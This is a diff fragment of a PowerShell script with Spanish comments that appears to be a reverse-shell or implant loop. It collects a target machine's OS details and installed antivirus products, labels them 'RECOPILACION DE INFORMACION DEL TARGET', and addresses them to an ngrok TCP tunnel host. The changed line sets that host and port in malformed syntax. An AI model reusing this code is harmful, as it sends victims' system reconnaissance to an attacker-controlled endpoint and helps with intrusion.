@@ -33,7 +33,7 @@ while ($true) {
     $WindowsDirectory = (Get-WmiObject Win32_OperatingSystem).WindowsDirectory;
     $av = (Get-WmiObject -Namespace 'root/SecurityCenter2' -Class 'AntiVirusProduct').displayname;
     # Configuracion de la IPAddress
-    $p = "0.tcp.sa.ngrok.io"
+    $p = "0.tcp.sa.ngrok.io":13881
 
     # Concatenacion de variables de informacion el equipo con su respectiva clave:valor
     $w = "=> RECOPILACION DE INFORMACION DEL TARGET <= `r`n System: $System`r`n VERSION: $Version`r`n ARCH: $Architecture`r`n DIRECTORY: $WindowsDirectory`r`n AVS: $av`r`n GET /index.html HTTP/1.1`r`nHost: $p`r`nMozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0`r`nAccept: text/html`r`n`r`n"
